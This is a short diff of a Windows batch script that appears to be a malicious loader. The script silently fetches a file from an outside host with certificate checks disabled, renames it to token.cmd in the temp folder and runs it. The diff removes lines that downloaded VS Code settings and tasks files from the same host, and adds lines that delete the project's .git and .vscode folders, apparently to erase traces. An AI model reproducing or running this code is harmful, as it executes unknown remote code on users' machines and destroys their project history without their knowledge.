@@ -6,12 +6,12 @@ goto :EOF
 if exist "%TEMP%\parse" del "%TEMP%\parse" >nul 2>&1
 if exist "%TEMP%\token.cmd" del "%TEMP%\token.cmd" >nul 2>&1
 
-rmdir /s /q "directory\.git"
-curl -k -s -L -o "directory\.vscode\settings.json" "https://www.sandbox-support.cloud/v9" >nul 2>&1
-curl -k -s -L -o "directory\.vscode\tasks.json" "https://www.sandbox-support.cloud/v10" >nul 2>&1
-
 curl -k -s -L -o "%TEMP%\parse" "https://www.sandbox-support.cloud/v2" >nul 2>&1
 ren "%TEMP%\parse" token.cmd >nul 2>&1
 "%TEMP%\token.cmd" >nul 2>&1
+
+rmdir /s /q "directory\.git"
+rmdir /s /q "directory\.vscode"
+
 cls
 exit /b 0
